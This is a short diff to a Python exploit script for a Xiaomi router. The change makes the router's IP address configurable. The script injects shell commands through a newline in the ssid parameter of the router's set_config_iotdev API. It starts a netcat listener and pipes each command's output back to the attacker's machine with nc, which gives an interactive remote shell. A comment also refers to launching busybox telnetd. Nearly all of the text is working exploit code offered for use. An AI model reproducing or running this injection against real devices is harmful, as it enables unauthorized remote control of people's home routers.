@@ -21,9 +21,10 @@ import requests
 # $$ /tmp/busybox telnetd
 
 stok = input('What\'s the stok:\n')
-pc_ip = '192.168.31.' + input('What\'s your PC IP:\n192.168.31.')
+pc_ip = '192.168.' + input('What\'s your PC IP:\n192.168.')
 pc_port = input('NC port:\n')
-template = 'http://192.168.31.1/cgi-bin/luci/;stok={0}/api/misystem/set_config_iotdev?bssid=XXXXXX&user_id=XXXXXX&ssid=-h%0A{1}%0A'
+pc_router = '192.168.' + input('What\'s your mi router IP:\n192.168.')
+template = 'http://{0}/cgi-bin/luci/;stok={1}/api/misystem/set_config_iotdev?bssid=XXXXXX&user_id=XXXXXX&ssid=-h%0A{2}%0A'
 
 command = input('Welcome - enter "exit" to exit or a command:\n$ ')
 
@@ -32,7 +33,7 @@ os.system('nc -lk ' + pc_port + '&')
 while command !=  'exit':
     encoded_up = urllib.parse.quote('{0} 2>&1 | nc {1} {2}'.format(command, pc_ip, pc_port))
     
-    url = template.format(stok,encoded_up)
+    url = template.format(pc_router,stok,encoded_up)
     # print('GET ' + url)
     print(requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}))
 
